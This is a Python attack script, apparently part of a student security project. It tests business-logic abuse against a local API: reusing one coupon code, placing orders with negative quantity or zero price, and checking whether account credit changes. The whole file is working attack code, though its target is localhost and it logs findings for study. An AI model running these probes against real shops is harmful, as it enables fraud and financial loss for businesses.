#!/usr/bin/env python3
"""
ATTACK 10: Unrestricted Access to Sensitive Business Flows
OWASP: API6:2023 (Business Logic)
What: Abuse business logic to get unintended benefits
How: Manipulate coupon codes, referrals, or shop flows
Why dangerous: Financial loss, data manipulation
"""
import requests
import json
import datetime
import time

TARGET = "http://localhost:8888"
RESULTS = "/home/xd-strange24/mscproject/experiments"

def run(token):
    print("=" * 55)
    print("ATTACK 10: BUSINESS FLOW ABUSE (API6:2023)")
    print("Unrestricted Access to Sensitive Business Flows")
    print("=" * 55)

    headers = {
        "Authorization": "Bearer " + token,
        "Content-Type": "application/json"
    }

    findings = []

    print("[*] Checking initial credit balance...\n")

    # Check initial balance
    r = requests.get(
        TARGET + "/identity/api/v2/user/dashboard",
        headers=headers, timeout=5
    )
    initial_credit = 0
    if r.status_code == 200:
        initial_credit = r.json().get("available_credit", 0)
        print("[BALANCE] Initial credit: " + str(initial_credit))

    print("\n[*] Testing coupon code abuse...\n")

    # Try to use same coupon multiple times
    coupon_tests = [
        {"coupon_code": "TRAC075", "vehicle_id": "test-vehicle-123"},
        {"coupon_code": "TRAC075", "vehicle_id": "test-vehicle-123"},
        {"coupon_code": "TRAC075", "vehicle_id": "test-vehicle-123"},
    ]

    for i, payload in enumerate(coupon_tests):
        print("[TEST " + str(i+1) + "] Applying coupon: " + payload["coupon_code"])
        try:
            r = requests.post(
                TARGET + "/workshop/api/v2/coupon/validate-coupon",
                json=payload,
                headers=headers,
                timeout=5
            )
            print("[STATUS] " + str(r.status_code))
            print("[RESPONSE] " + r.text[:200])

            if r.status_code == 200:
                findings.append({
                    "test": "Coupon reuse attempt " + str(i+1),
                    "result": "Coupon accepted",
                    "response": r.text[:100]
                })
                print("[!] COUPON ACCEPTED - attempt " + str(i+1))
        except Exception as e:
            print("[ERROR] " + str(e))
        time.sleep(0.5)

    print("\n[*] Testing shop item manipulation...\n")

    # Try to buy item with negative quantity
    shop_tests = [
        {
            "name": "Negative quantity order",
            "body": {"product_id": 1, "quantity": -1}
        },
        {
            "name": "Zero price manipulation",
            "body": {"product_id": 1, "quantity": 1, "price": 0}
        },
    ]

    for test in shop_tests:
        print("[TEST] " + test["name"])
        try:
            r = requests.post(
                TARGET + "/workshop/api/v2/order/users/orders",
                json=test["body"],
                headers=headers,
                timeout=5
            )
            print("[STATUS] " + str(r.status_code))
            print("[RESPONSE] " + r.text[:200])

            if r.status_code in [200, 201]:
                findings.append({
                    "test": test["name"],
                    "result": "Order accepted with manipulated values"
                })
                print("[!] BUSINESS LOGIC BYPASS!")
        except Exception as e:
            print("[ERROR] " + str(e))
        time.sleep(0.5)

    # Check final balance
    r = requests.get(
        TARGET + "/identity/api/v2/user/dashboard",
        headers=headers, timeout=5
    )
    if r.status_code == 200:
        final_credit = r.json().get("available_credit", 0)
        print("\n[BALANCE] Final credit: " + str(final_credit))
        if final_credit != initial_credit:
            print("[!] CREDIT CHANGED: " + str(initial_credit) + " → " + str(final_credit))
            findings.append({
                "test": "Credit manipulation",
                "initial": initial_credit,
                "final": final_credit
            })

    print("\n[RESULT] " + str(len(findings)) + " business flow issues found")
    print("[SEVERITY] " + ("HIGH" if findings else "LOW"))
    print("[SPLUNK] Check: index=api_logs coupon OR order")

    result = {
        "attack": "Business Flow Abuse",
        "owasp": "API6:2023",
        "timestamp": datetime.datetime.now().isoformat(),
        "initial_credit": initial_credit,
        "findings": findings,
        "severity": "HIGH" if findings else "LOW"
    }

    ts = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
    path = RESULTS + "/attack10_businessflow_" + ts + ".json"
    with open(path, "w") as f:
        json.dump(result, f, indent=2)
    print("[SAVED] " + path)
    return result

if __name__ == "__main__":
    token = input("Enter Bearer token: ").strip()
    run(token)
